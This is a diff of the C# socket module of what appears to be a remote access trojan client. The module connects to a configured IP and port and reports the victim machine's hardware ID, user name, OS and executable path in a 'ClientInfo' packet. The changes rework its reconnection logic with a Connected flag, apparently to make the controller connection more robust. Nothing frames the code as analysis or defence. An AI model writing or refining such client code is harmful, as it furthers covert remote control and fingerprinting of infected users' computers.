@@ -22,6 +22,7 @@ namespace Client.Sockets
         private static Timer Tick { get; set; }
         private static MemoryStream MS { get; set; }
         private static object SendSync { get; set; }
+        public static bool Connected { get; set; }
 
         public static void InitializeClient()
         {
@@ -36,6 +37,7 @@ namespace Client.Sockets
                 };
                 Client.Connect(Settings.IP, Convert.ToInt32(Settings.Port));
                 Debug.WriteLine("Connected!");
+                Connected = true;
                 Buffer = new byte[1];
                 Buffersize = 0;
                 BufferRecevied = false;
@@ -50,25 +52,23 @@ namespace Client.Sockets
             {
                 Debug.WriteLine("Disconnected!");
                 Thread.Sleep(new Random().Next(1 * 1000, 6 * 1000));
-                Reconnect();
+                Connected = false;
             }
         }
 
         public static void Reconnect()
         {
 
-            Tick?.Dispose();
-
             try
             {
-                Client?.Close();
+                Tick?.Dispose();
                 Client?.Dispose();
+                MS?.Dispose();
             }
-            catch { }
-
-            MS?.Dispose();
-
-            InitializeClient();
+            finally
+            {
+                InitializeClient();
+            }
         }
 
         private static byte[] SendInfo()
@@ -77,7 +77,7 @@ namespace Client.Sockets
             msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
             msgpack.ForcePathObject("HWID").AsString = HWID();
             msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
-            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft",null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
+            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " + Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
             msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
             msgpack.ForcePathObject("Version").AsString = Settings.Version;
             return msgpack.Encode2Bytes();
@@ -110,7 +110,7 @@ namespace Client.Sockets
             {
                 if (!Client.Connected)
                 {
-                    Reconnect();
+                    Connected = false;
                     return;
                 }
 
@@ -151,13 +151,13 @@ namespace Client.Sockets
                 }
                 else
                 {
-                    Reconnect();
+                    Connected = false;
                     return;
                 }
             }
             catch
             {
-                Reconnect();
+                Connected = false;
                 return;
             }
         }
@@ -168,7 +168,7 @@ namespace Client.Sockets
             {
                 if (!Client.Connected)
                 {
-                    Reconnect();
+                    Connected = false;
                     return;
                 }
 
@@ -186,7 +186,7 @@ namespace Client.Sockets
                 }
                 catch
                 {
-                    Reconnect();
+                    Connected = false;
                     return;
                 }
             }
@@ -200,7 +200,7 @@ namespace Client.Sockets
             }
             catch
             {
-                Reconnect();
+                Connected = false;
                 return;
             }
         }
